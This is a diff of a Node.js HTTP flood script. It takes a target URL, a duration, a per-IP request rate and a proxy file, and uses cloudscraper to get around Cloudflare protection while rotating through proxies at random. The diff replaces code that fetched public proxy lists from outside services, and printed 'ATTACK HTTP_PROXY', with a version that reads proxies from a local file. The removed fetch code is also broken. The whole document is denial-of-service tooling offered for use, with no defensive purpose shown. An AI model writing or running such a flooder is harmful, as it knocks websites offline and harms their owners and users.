@@ -1,13 +1,12 @@
 require('events').EventEmitter.defaultMaxListeners = 0;
 const fs = require('fs'),
     CloudScraper = require('cloudscraper'),
-    axios = require('axios'),
     path = require('path');
 
 if (process.argv.length !== 6) {
     console.log(`
 Usage: node ${path.basename(__filename)} <url> <time> <req_per_ip> <proxies>
-Usage: node ${path.basename(__filename)} <http://example.com> <60> <100> <http.txt>`);
+Usage: node ${path.basename(__filename)} <http://example.com> <60> <100> <filename.txt>`);
     process.exit(0);
 }
 
@@ -15,17 +14,7 @@ const target = process.argv[2],
     time = process.argv[3],
     req_per_ip = process.argv[4];
 
-if (process.argv[5] == "proxy") {
-	console.log('ATTACK HTTP_PROXY');
-	const proxyscrape_http = axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all');
-	const proxy_list_http = axios.get('https://www.proxy-list.download/api/v1/get?type=http');
-	const raw_github_http = axios.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
-	var proxies = proxyscrape_http.data.replace(/\r/g, '').split('\n');
-	var proxies = proxy_list_http.data.replace(/\r/g, '').split('\n');
-	var proxies = raw_github_http.data.replace(/\r/g, '').split('\n');
-} else {
-	console.log('ATTACK HTTP_PROXY');
-}
+let proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);
 
 function send_req() {
     let proxy = proxies[Math.floor(Math.random() * proxies.length)];
